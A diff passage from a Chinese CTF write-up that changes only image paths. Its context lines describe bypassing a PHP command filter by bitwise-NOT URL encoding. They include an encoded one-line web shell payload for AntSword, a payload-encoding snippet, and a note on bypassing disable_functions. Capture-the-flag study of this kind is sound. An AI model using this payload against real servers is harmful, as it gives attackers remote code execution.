@@ -30,7 +30,7 @@ else{
 ```
 2. 采用~对cmd按位取反，以phpinfo为例。
 - `php -r "echo urlencode(~'phpinfo');"`得到`%8F%97%8F%96%91%99%90`
-  ![](images/jk-rce-1.png)
+  ![](../images/jk-rce-1.png)
 3. 对一句话木马取反url编码，取反代码如下。用AntSword连接载荷`code=(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%DD%8C%97%9A%93%93%DD%A2%D6%D6);`
 ```php
 <?php
@@ -42,7 +42,7 @@ echo urlencode(~$b);
 ?>
 ```
 4. /flag文件没有flag，执行/readflag，得到flag。
-   ![](images/jk-rce-2.png)
+   ![](../images/jk-rce-2.png)
 
 ## 总结
 在CMD字符被过滤时，可以用~取反urlencode绕过限制。用AntSword连接一句话木马时，可以用插件市场bypass插件bypass disable_functions
